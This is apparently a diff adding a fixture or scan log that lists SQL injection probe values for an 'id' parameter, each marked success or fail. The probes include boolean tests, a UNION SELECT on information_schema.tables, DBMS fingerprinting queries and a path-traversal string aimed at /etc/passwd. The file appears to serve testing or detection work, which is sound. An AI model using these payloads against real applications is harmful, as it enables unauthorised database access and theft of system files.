@@ -1,0 +1,22 @@
+id=1 => success
+id=1&BZEB=1608 AND 1=1 UNION ALL SELECT 1,2,3,table_name FROM information_schema.tables WHERE 2>1-- ../../../etc/passwd => success
+id=1 => success
+id=3030 => fail
+id=6075 => fail
+id=1)((.,,'.(' => fail
+id=5203-5202 => success
+id=1'LJqXrN<'">ZAxEWW => fail
+id=1) AND 9035=3085 AND (4566=4566 => fail
+id=1) AND 5761=5761 AND (1984=1984 => fail
+id=1 AND 2607=6189 => fail
+id=1 AND 5761=5761 => success
+id=1 AND 5921=5329 => fail
+id=1 AND (SELECT CHR(69)&CHR(100)&CHR(113)&CHR(100) FROM MSysAccessObjects)=CHR(69)&CHR(100)&CHR(113)&CHR(100) => fail
+id=1 AND (SELECT CHR(120)||CHR(106)||CHR(75)||CHR(72) FROM SYSIBM.SYSDUMMY1)=CHR(120)||CHR(106)||CHR(75)||CHR(72) => fail
+id=1 AND (SELECT 'DqyO' FROM RDB$DATABASE)='DqyO' => fail
+id=1 AND (SELECT CHAR(82)||CHAR(82)||CHAR(80)||CHAR(84) FROM INFORMATION_SCHEMA.SYSTEM_USERS)=CHAR(82)||CHAR(82)||CHAR(80)||CHAR(84) => fail
+id=1 AND (SELECT 'ZCvm' FROM VERSIONS)='ZCvm' => fail
+id=1 AND (SELECT CHAR(67)+CHAR(106)+CHAR(65)+CHAR(79))=CHAR(67)+CHAR(106)+CHAR(65)+CHAR(79) => success
+id=1 AND (SELECT CHAR(67)+CHAR(106)+CHAR(65)+CHAR(79))=CHAR(82)+CHAR(70)+CHAR(73)+CHAR(98) => success
+id=1 AND (SELECT 0x63475656)=0x63475656 => success
+id=1 AND (SELECT 0x63475656)=0x79564d47 => fail
